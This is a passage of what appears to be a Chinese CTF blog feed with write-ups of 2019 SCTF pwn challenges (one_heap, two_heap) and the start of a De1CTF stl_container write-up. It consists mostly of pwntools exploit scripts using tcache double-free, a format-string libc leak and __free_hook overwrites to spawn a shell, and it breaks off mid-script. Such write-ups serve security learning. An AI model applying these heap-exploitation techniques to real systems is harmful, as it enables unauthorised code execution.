punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./one_heap"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./one_heap"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token operator">*</span><span class="token number">0x68</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 1</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\x10\x70"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token string">'\xff'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"\x60\x07\xdd"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 大的size不能滿足後面的double free時的題目size限制範圍</span>create<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">"\x80"</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdout_"</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span><span class="token number">0x4f322</span><span class="token punctuation">,</span><span class="token number">0x10a38c</span><span class="token punctuation">]</span>one_gadget <span class="token operator">=</span> one_gadgets<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_basefree_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="two-heap"><a href="#two-heap" class="headerlink" title="two_heap"></a>two_heap</h1><h2 id="查看文件-2"><a href="#查看文件-2" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/10.png"></div><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/11.png"></div>这里有格式化字符串漏洞，可以利用%a leak libc地址<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2019-sctf-bu-fen-pwn-ti-fu-pan/12.png"></div>通过这个函数来进行预防相同size的创建。<h2 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h2><p>格式化字符串，开始输入，%a*5会leak出libc地址，必须在libc2.26才能打印出stdout地址。</p><p>可以绕过size检查：0、8、0x10、0x18，这些都可以创建0x20chunk，那么就可以UAF后的fastbin attack（Tcache）</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> oscontext<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./two_heap"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_ld</span><span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Force to use assigned new ld.so by changing the binary    """</span>    <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>ld<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>        log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to ld"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> None    <span class="token keyword">if</span> <span class="token operator">not</span> isinstance<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> ELF<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>binary<span class="token punctuation">,</span> os<span class="token punctuation">.</span>R_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>            log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Invalid path {} to binary"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>binary<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> None        binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>    <span class="token keyword">for</span> segment <span class="token keyword">in</span> binary<span class="token punctuation">.</span>segments<span class="token punctuation">:</span>        <span class="token keyword">if</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'PT_INTERP'</span><span class="token punctuation">:</span>            size <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_memsz'</span><span class="token punctuation">]</span>            addr <span class="token operator">=</span> segment<span class="token punctuation">.</span>header<span class="token punctuation">[</span><span class="token string">'p_paddr'</span><span class="token punctuation">]</span>            data <span class="token operator">=</span> segment<span class="token punctuation">.</span>data<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> size <span class="token operator">&lt;=</span> len<span class="token punctuation">(</span>ld<span class="token punctuation">)</span><span class="token punctuation">:</span>                log<span class="token punctuation">.</span>failure<span class="token punctuation">(</span><span class="token string">"Failed to change PT_INTERP from {} to {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> None            binary<span class="token punctuation">.</span>write<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> ld<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token operator">not</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>mkdir<span class="token punctuation">(</span><span class="token string">'/tmp/pwn'</span><span class="token punctuation">)</span>            path <span class="token operator">=</span> <span class="token string">'/tmp/pwn/{}_debug'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>basename<span class="token punctuation">(</span>binary<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> os<span class="token punctuation">.</span>access<span class="token punctuation">(</span>path<span class="token punctuation">,</span> os<span class="token punctuation">.</span>F_OK<span class="token punctuation">)</span><span class="token punctuation">:</span>                os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                info<span class="token punctuation">(</span><span class="token string">"Removing exist file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span>            binary<span class="token punctuation">.</span>save<span class="token punctuation">(</span>path<span class="token punctuation">)</span>                os<span class="token punctuation">.</span>chmod<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token number">0b111000000</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#rwx------</span>    success<span class="token punctuation">(</span><span class="token string">"PT_INTERP has changed from {} to {}. Using temp file {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>data<span class="token punctuation">,</span> ld<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ELF<span class="token punctuation">(</span>path<span class="token punctuation">)</span>elf <span class="token operator">=</span> change_ld<span class="token punctuation">(</span><span class="token string">'./two_heap'</span><span class="token punctuation">,</span> <span class="token string">'./ld.so.2'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> elf<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'LD_PRELOAD'</span><span class="token punctuation">:</span><span class="token string">'./libc-2.26.so'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.26.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"SCTF:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"note:\n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"choice:"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"index:\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>start<span class="token punctuation">(</span><span class="token string">"%a%a%a%a%a\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x0p+00x0p+00x0.0"</span><span class="token punctuation">)</span>one_gadgets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x45e0a</span><span class="token punctuation">,</span><span class="token number">0x45e5e</span><span class="token punctuation">,</span><span class="token number">0xe361b</span><span class="token punctuation">]</span>data <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> data<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"_IO_2_1_stdout_"</span><span class="token punctuation">]</span><span class="token keyword">print</span> hex<span class="token punctuation">(</span>data<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># delete(1)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">+</span>libc_base<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'/bin/sh'</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2019 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2.23 FSOP </tag>
            
            <tag> io leak </tag>
            
            <tag> off by null </tag>
            
            <tag> 格式化字符串 </tag>
            
            <tag> 2.27 hijacking tcache header </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 De1CTF部分pwn题复盘</title>
      <link href="/2020/10/09/2020-de1ctf-bu-fen-pwn-ti-fu-pan/"/>
      <url>/2020/10/09/2020-de1ctf-bu-fen-pwn-ti-fu-pan/</url>
      
        <content type="html"><![CDATA[<h1 id="stl-container"><a href="#stl-container" class="headerlink" title="stl_container"></a>stl_container</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2020-de1ctf-bu-fen-pwn-ti-fu-pan/0.png"></div>保护全开2.27 libc，C++题vector释放机制漏洞<h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>题目提供四个机制：list、vector、stack、queue<br>每个机制下都有一个小菜单，分别是create、delete、show。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2020-de1ctf-bu-fen-pwn-ti-fu-pan/1.png"></div><p>看了半天，调试半天还是没找到漏洞在哪里，没办法就搜了一下各个C++封装结构的机制漏洞，我们定位到vector的erase释放机制。</p><h2 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h2><p>用一种简单的方法阐述这个漏洞机制：<br>比如vector中有如下内容：</p><table><thead><tr><th>1</th><th>2</th><th>3</th><th>4</th></tr></thead></table><p>此时我们删除2</p><p>第一步：执行 copy，右边的指针全部左移</p><table><thead><tr><th>1</th><th>3</th><th>4</th><th>4</th></tr></thead></table><p>第二步：调用析构函数删除最后一个指针的内容destroy(finish)，执行的是第四个元素的析构函数，但是我们删除的第二个元素却并没有释放空间，此时就可能造成UAF</p><p>那么对应动态分配heap内存就是，先heap地址左移，并释放最后元素的heap空间。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>利用上面学到的东西再去调试：</p><pre class="line-numbers language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>aaaa<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>aaaa<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>果然就看到了heap地址</p><p>create两个vector元素：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2020-de1ctf-bu-fen-pwn-ti-fu-pan/2.png"></div><p>delete(0),不出意外会出现0x000055555576e5f0的chunk被释放，同时0x000055555576e5f0左移到第一个位置。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/10/09/2020-de1ctf-bu-fen-pwn-ti-fu-pan/3.png"></div><p>果然如此，这样就好做了，double free</p><p>利用其它结构填满0xa0 tcache来泄露libc地址，再通过UAF改fd为free_hook，分配到后改为system，system(“/bin/sh”)即可getshell。</p><p>开始没注意到析构函数会自动释放一个0xa0的chunk，加上其它三个结构每个结构两个chunk，刚好填满tcache，就可以泄露libc地址。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> data  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>    <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> delims  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> data  <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> data  <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv  <span class="token operator">=</span> <span class="token keyword">lambda</span>  <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./stl_container"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./stl_container"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.197.50"</span><span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./stl_container"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">listFunc</span><span class="token punctuation">(</span>choice<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> choice<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>        sa<span class="token punctuation">(</span><span class="token string">"data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>        sla<span class="token punctuation">(</span><span class="token string">"index?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>        sla<span class="token punctuation">(</span><span class="token string">"index?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vectorFunc</span><span class="token punctuation">(</span>choice<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>index<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> choice<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>         sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>        sa<span class="token punctuation">(</span><span class="token string">"data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>        sla<span class="token punctuation">(</span><span class="token string">"index?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> choice<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">:</span>        sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>        sla<span class="token punctuation">(</span><span class="token string">"index?\n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">queueFunc</span><span class="token punctuation">(</span>choice<span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token 